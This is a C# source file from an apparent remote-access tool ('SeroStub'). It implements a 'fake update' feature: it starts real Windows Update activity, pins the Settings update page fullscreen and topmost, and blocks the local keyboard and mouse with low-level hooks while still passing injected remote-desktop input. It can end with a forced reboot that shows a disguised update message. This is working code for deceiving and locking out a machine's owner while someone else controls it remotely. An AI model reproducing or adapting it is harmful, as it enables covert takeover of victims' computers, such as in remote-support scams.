using System.Runtime.InteropServices;
using System.Text.Json;

namespace SeroStub;

// Triggers real Windows Update activity via usoclient.exe, then opens the genuine
// Settings > Windows Update page and blocks hardware input (keyboard + mouse).
// RDP injected input passes through via LLKHF_INJECTED / LLMHF_INJECTED flags.
// Elevated: StartDownload → real download progress shown in Settings.
// Standard user fallback: StartScan → "Checking for updates…" shown in Settings.
internal static class FakeUpdateFeature
{
    [DllImport("user32.dll")]
    private static extern bool GetMessageW(out MSG msg, nint hwnd, uint min, uint max);
    [DllImport("user32.dll")]
    private static extern bool TranslateMessage(ref MSG msg);
    [DllImport("user32.dll")]
    private static extern nint DispatchMessageW(ref MSG msg);
    [DllImport("user32.dll")]
    private static extern nint SetWindowsHookExW(int type, nint proc, nint hmod, uint tid);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(nint hhk);
    [DllImport("user32.dll")]
    private static extern nint CallNextHookEx(nint hhk, int code, nuint w, nint l);
    [DllImport("user32.dll")]
    private static extern bool PostThreadMessageW(uint tid, uint msg, nuint w, nint l);
    [DllImport("user32.dll")]
    private static extern nint GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern nint FindWindowExW(nint parent, nint after, string cls, string? title);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int GetClassNameW(nint hwnd, char[] buf, int max);
    [DllImport("user32.dll")]
    private static extern bool ShowWindow(nint hwnd, int cmd);
    [DllImport("user32.dll")]
    private static extern bool SetWindowPos(nint hwnd, nint after, int x, int y, int cx, int cy, uint flags);
    [DllImport("kernel32.dll")]
    private static extern uint GetCurrentThreadId();
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    private static extern nint GetModuleHandleW(string? name);
    [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
    private static extern nint ShellExecuteW(nint hwnd, string op, string file, string? param, string? dir, int show);
    [DllImport("shell32.dll")]
    private static extern bool IsUserAnAdmin();

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG { public nint hwnd; public uint message; public nuint wParam; public nint lParam; public uint time; public int ptX, ptY; }
    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT { public uint vkCode, scanCode, flags, time; public nuint dwExtraInfo; }
    [StructLayout(LayoutKind.Sequential)]
    private struct MSLLHOOKSTRUCT  { public int ptX, ptY; public uint mouseData, flags, time; public nuint dwExtraInfo; }

    private const uint WM_QUIT        = 0x0012;
    private const int  SW_MAXIMIZE    = 3;
    private const int  SW_RESTORE     = 9;
    private const nint HWND_TOPMOST   = -1;
    private const nint HWND_NOTOPMOST = -2;
    private const uint SWP_NOMOVE     = 0x0002;
    private const uint SWP_NOSIZE     = 0x0001;
    private const uint LLKHF_INJECTED = 0x10;
    private const uint LLMHF_INJECTED = 0x01;

    private static volatile bool _active;
    private static volatile uint _hookTid;
    private static nint          _kbHook, _mouseHook;
    private static Thread?       _thread;
    private static System.Threading.Timer? _durationTimer;
    private static bool          _rebootAfter;
    private static nint          _settingsHwnd;

    private static LowLevelHookProc? _kbDelegate, _mouseDelegate;
    private delegate nint LowLevelHookProc(int code, nuint w, nint l);

    internal static string Start(int durationMinutes, bool rebootAfter)
    {
        if (_active) return Ack(true, "");
        _active      = true;
        _rebootAfter = rebootAfter;

        // Trigger real Windows Update activity.
        // Elevated → StartDownload shows real download progress in Settings.
        // Standard user → StartScan shows "Checking for updates…" (always works).
        bool elevated = false;
        try { elevated = IsUserAnAdmin(); } catch { }

        if (elevated)
        {
            RunUsoClient("StartDownload");
            // Also kick off install in case updates were already downloaded
            RunUsoClient("StartInstall");
        }
        // StartScan always works and ensures Settings shows activity
        RunUsoClient("StartScan");

        // Small delay so the scan registers before Settings opens
        Thread.Sleep(600);

        // Open real Windows Update page in Settings
        ShellExecuteW(nint.Zero, "open", "ms-settings:windowsupdate", null, null, SW_MAXIMIZE);

        _thread = new Thread(HookThread) { IsBackground = true };
        _thread.Start();

        if (durationMinutes > 0)
            _durationTimer = new System.Threading.Timer(_ => OnExpired(), null,
                TimeSpan.FromMinutes(durationMinutes), Timeout.InfiniteTimeSpan);

        return Ack(true, "");
    }

    private static void RunUsoClient(string arg)
    {
        try
        {
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
                "usoclient.exe", arg)
                { CreateNoWindow = true, UseShellExecute = false });
        }
        catch { }
    }

    private static void HookThread()
    {
        _hookTid = GetCurrentThreadId();

        // Give Settings time to open and come to foreground
        Thread.Sleep(2000);

        _settingsHwnd = FindSettingsWindow();
        if (_settingsHwnd != nint.Zero)
        {
            ShowWindow(_settingsHwnd, SW_MAXIMIZE);
            SetWindowPos(_settingsHwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        }

        var hInst = GetModuleHandleW(null);
        _kbDelegate    = KbHook;
        _mouseDelegate = MouseHook;
        _kbHook    = SetWindowsHookExW(13, Marshal.GetFunctionPointerForDelegate(_kbDelegate),    hInst, 0);
        _mouseHook = SetWindowsHookExW(14, Marshal.GetFunctionPointerForDelegate(_mouseDelegate), hInst, 0);

        while (GetMessageW(out var msg, nint.Zero, 0, 0))
        {
            TranslateMessage(ref msg);
            DispatchMessageW(ref msg);
        }

        if (_kbHook    != nint.Zero) { UnhookWindowsHookEx(_kbHook);    _kbHook    = nint.Zero; }
        if (_mouseHook != nint.Zero) { UnhookWindowsHookEx(_mouseHook); _mouseHook = nint.Zero; }
    }

    private static void OnExpired()
    {
        bool doReboot = _rebootAfter;
        StopInternal();
        if (doReboot)
        {
            try
            {
                // Natural-looking restart message, 30-second countdown
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
                    "shutdown.exe", "/r /t 30 /c \"Windows has installed updates and needs to restart.\"")
                    { CreateNoWindow = true, UseShellExecute = false });
            }
            catch { }
        }
    }

    internal static void Stop() => StopInternal();

    private static void StopInternal()
    {
        _active = false;
        _durationTimer?.Dispose(); _durationTimer = null;

        var tid = _hookTid;
        if (tid != 0) { PostThreadMessageW(tid, WM_QUIT, 0, 0); _hookTid = 0; }

        var hw = _settingsHwnd;
        if (hw != nint.Zero)
        {
            SetWindowPos(hw, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
            ShowWindow(hw, SW_RESTORE);
            _settingsHwnd = nint.Zero;
        }
    }

    private static nint FindSettingsWindow()
    {
        var fg = GetForegroundWindow();
        if (IsAppFrame(fg)) return fg;

        nint h = nint.Zero;
        while (true)
        {
            h = FindWindowExW(nint.Zero, h, "ApplicationFrameWindow", null);
            if (h == nint.Zero) break;
            return h;
        }
        return nint.Zero;
    }

    private static bool IsAppFrame(nint hwnd)
    {
        if (hwnd == nint.Zero) return false;
        var buf = new char[64];
        GetClassNameW(hwnd, buf, buf.Length);
        return new string(buf).TrimEnd('\0') == "ApplicationFrameWindow";
    }

    private static nint KbHook(int code, nuint w, nint l)
    {
        if (code >= 0)
        {
            var ks = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(l);
            if ((ks.flags & LLKHF_INJECTED) == 0) return 1;
        }
        return CallNextHookEx(_kbHook, code, w, l);
    }

    private static nint MouseHook(int code, nuint w, nint l)
    {
        if (code >= 0)
        {
            var ms = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(l);
            if ((ms.flags & LLMHF_INJECTED) == 0) return 1;
        }
        return CallNextHookEx(_mouseHook, code, w, l);
    }

    private static string Ack(bool ok, string err) =>
        JsonSerializer.Serialize(new FakeUpdateAckStub { Success = ok, Error = err }, SeroJson.Default.FakeUpdateAckStub);
}

internal class FakeUpdateStartDataStub { public int DurationMinutes { get; set; } public bool RebootAfter { get; set; } }
internal class FakeUpdateAckStub       { public bool Success { get; set; } public string Error { get; set; } = ""; }
